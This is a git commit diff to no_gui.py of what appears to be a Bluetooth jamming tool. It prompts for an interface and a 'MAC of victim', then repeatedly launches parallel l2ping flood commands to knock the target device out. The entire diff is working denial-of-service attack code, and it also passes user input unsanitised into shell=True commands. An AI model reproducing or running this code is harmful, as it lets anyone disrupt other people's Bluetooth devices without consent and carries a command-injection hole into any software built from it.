2196833f0a187b30d37d1e7539424c571daf269a
void <fluffy.siberian.cat@gmail.com>
2023-05-01 15:02:15 +1000

    V 1.4

--- no_gui.py
+++ no_gui.py
@@ -2,19 +2,22 @@ import subprocess
 import headers
 
 def no_gui():
-    print("No GUI Version")
-    print(" ")
-    interface = input("Your BT interface : ")
-    mac = input("MAC of victim: ")
-    time = 999
-    print("Start jamming...")
-    delay = int(time)
+    try:
+        print("No GUI Version")
+        print(" ")
+        interface = input("Your BT interface : ")
+        mac = input("MAC of victim: ")
+        time = 999
+        print("Start jamming...")
+        delay = int(time)
 
-    while delay != 0:
-        xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-        xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-        xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
-        subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-        delay -= 1
+        while delay != 0:
+            xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+            xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+            xterm_3 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface , mac)
+            subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_2, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            subprocess.Popen(xterm_3, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+            delay -= 1
+    except OSError:
+        print("done")
